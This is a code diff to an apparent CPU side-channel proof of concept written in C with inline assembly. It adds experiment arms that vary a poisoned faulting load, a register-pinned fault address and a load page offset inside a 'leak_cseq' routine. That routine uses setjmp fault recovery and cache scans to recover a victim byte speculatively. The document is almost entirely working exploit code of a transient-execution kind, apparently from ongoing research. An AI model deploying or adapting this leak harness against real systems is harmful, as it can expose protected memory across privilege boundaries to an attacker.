@@ -318,6 +318,9 @@ static int cseq_vaddr = 0;
 static int cseq_noppre = 0;
 static int cseq_poison_full = 0;
 static int cseq_poison_other = 0;
+static int cseq_poison_keep = 0;
+static int cseq_poison_full_keep = 0;
+static int cseq_loadoff = -1; /* faulting-load offset; -1 follows OFFSET */
 static jmp_buf sj_buf;
 
 /* 2026-09-28 arms. Scalars and pointers only: no new large statics, because
@@ -748,8 +751,15 @@ static void maccess_line(void *p)
  * store, CSEQ_POISON adds the stock al=0x2a poison before the faulting
  * load, CSEQ_NOPPRE a single nop in the poison's place, CSEQ_POISON_FULL a
  * full-width eax write in its place, CSEQ_POISON_OTHER a partial write to
- * dl, CSEQ_VF the stock test/jz + conditional clflush branch before the
- * store, CSEQ_PROLOGUE the stock skip_to prologue before the block, and
+ * dl, CSEQ_POISON_KEEP and CSEQ_POISON_FULL_KEEP the same destination
+ * writes with the fault address held in a pinned spare register, so the
+ * load address does not move (the plain POISON arms rewrite it: the al
+ * write replaces the low address byte with 0x2a and the eax write replaces
+ * the whole address, turning the #GP into a #PF -- 2026-09-29 deconfound),
+ * CSEQ_LOADOFF=<hex> overrides the faulting-load page offset alone (the
+ * store keeps OFFSET; -1 follows OFFSET), CSEQ_VF the stock test/jz +
+ * conditional clflush branch before the store, CSEQ_PROLOGUE the stock
+ * skip_to prologue before the block, and
  * CSEQ_VADDR the stock victim-byte-dependent fault address. CSEQ_SCAN
  * appends one full 64-class scan after the rounds. The index uses
  * the VALUE transform, so slot 61 is the canary class for canary 0x42.
@@ -784,10 +794,19 @@ static void cseq_barrier(void)
         asm volatile("lfence" ::: "memory");
 }
 
+/* Faulting-load address for the CSEQ attempt; CSEQ_LOADOFF moves the load
+ * alone, the store stays at PAGE_OFFSET. */
+static unsigned char *cseq_fault_addr(void)
+{
+    if (cseq_loadoff >= 0)
+        return (unsigned char *)page_atk + cseq_loadoff;
+    return (unsigned char *)page_atk + PAGE_OFFSET;
+}
+
 static void leak_cseq(void)
 {
     if (cseq_rip) {
-        unsigned char *atk = (unsigned char *)page_atk + PAGE_OFFSET;
+        unsigned char *atk = cseq_fault_addr();
 
         cseq_miss_block();
         cseq_store_canary();
@@ -802,7 +821,7 @@ static void leak_cseq(void)
     }
     if (cseq_sjfirst) {
         if (setjmp(sj_buf) == 0) {
-            unsigned char *atk = (unsigned char *)page_atk + PAGE_OFFSET;
+            unsigned char *atk = cseq_fault_addr();
 
             cseq_miss_block();
             cseq_store_canary();
@@ -831,14 +850,15 @@ static void leak_cseq(void)
     cseq_barrier();
     asm volatile("" ::: "memory");
     if (setjmp(sj_buf) == 0) {
-        unsigned char *atk = (unsigned char *)page_atk + PAGE_OFFSET;
+        unsigned char *atk = cseq_fault_addr();
         unsigned long off;
 
         asm volatile("" ::: "memory");
         if (cseq_vaddr)
             atk += ((unsigned char)*(volatile unsigned char *)
                     (page_v + PAGE_OFFSET)) >> 12;
-        if (cseq_poison || cseq_poison_full || cseq_poison_other ||
+        if (cseq_poison || cseq_poison_full || cseq_poison_keep ||
+            cseq_poison_full_keep || cseq_poison_other ||
             cseq_noppre || cseq_loadal) {
             unsigned int v;
 
@@ -852,7 +872,21 @@ static void leak_cseq(void)
                              "movb (%1), %%al\n\t"
                              "movzbl %%al, %0"
                              : "=r"(v) : "a"(atk) : "memory");
-            else if (cseq_poison_other)
+            else if (cseq_poison_keep) {
+                register unsigned long fa asm("r8") = (unsigned long)atk;
+
+                asm volatile("movb $0x2a, %%al\n\t"
+                             "movb (%1), %%al\n\t"
+                             "movzbl %%al, %0"
+                             : "=r"(v) : "r"(fa) : "rax", "memory");
+            } else if (cseq_poison_full_keep) {
+                register unsigned long fa asm("r8") = (unsigned long)atk;
+
+                asm volatile("movl $0x2a, %%eax\n\t"
+                             "movb (%1), %%al\n\t"
+                             "movzbl %%al, %0"
+                             : "=r"(v) : "r"(fa) : "rax", "memory");
+            } else if (cseq_poison_other)
                 asm volatile("movb $0x2a, %%dl\n\t"
                              "movb (%1), %%al\n\t"
                              "movzbl %%al, %0"
@@ -1136,6 +1170,19 @@ static int parse_env(void)
         cseq_poison_full = 1;
     if (getenv("CSEQ_POISON_OTHER") != NULL)
         cseq_poison_other = 1;
+    if (getenv("CSEQ_POISON_KEEP") != NULL)
+        cseq_poison_keep = 1;
+    if (getenv("CSEQ_POISON_FULL_KEEP") != NULL)
+        cseq_poison_full_keep = 1;
+    s = getenv("CSEQ_LOADOFF");
+    if (s && *s) {
+        v = strtol(s, &end, 0);
+        if (*end || v < 0 || v > 0x1fff) {
+            fprintf(stderr, "CSEQ_LOADOFF must be 0..0x1fff\n");
+            return -1;
+        }
+        cseq_loadoff = (int)v;
+    }
     if (getenv("FRESH") != NULL)
         use_fresh = 1;
     if (getenv("SETJMP") != NULL)
@@ -1870,12 +1917,14 @@ int main(void)
         printf("cseq slot=%d trials=%d rounds=%d store=%d fresh=%d "
                "block=%d asmstore=%d rip=%d sjfirst=%d fence=%d lfence=%d "
                "loadal=%d asmchain=%d poison=%d noppre=%d pf=%d po=%d "
+               "keep=%d fkeep=%d loadoff=%d "
                "vf=%d prologue=%d vaddr=%d\n",
                slot_only, trials, rounds, cseq_store, use_fresh,
                cseq_block, cseq_asmstore, cseq_rip, cseq_sjfirst,
                cseq_fence, cseq_lfence, cseq_loadal, cseq_asmchain,
                cseq_poison, cseq_noppre, cseq_poison_full,
-               cseq_poison_other, cseq_vf, cseq_prologue, cseq_vaddr);
+               cseq_poison_other, cseq_poison_keep, cseq_poison_full_keep,
+               cseq_loadoff, cseq_vf, cseq_prologue, cseq_vaddr);
         probe_fn = trig_zero_fault ? leak_cseq_trig : leak_cseq;
         if (getenv("CSEQ_SCAN") != NULL) {
             struct round_result sr = scan_round(0, slot_only);
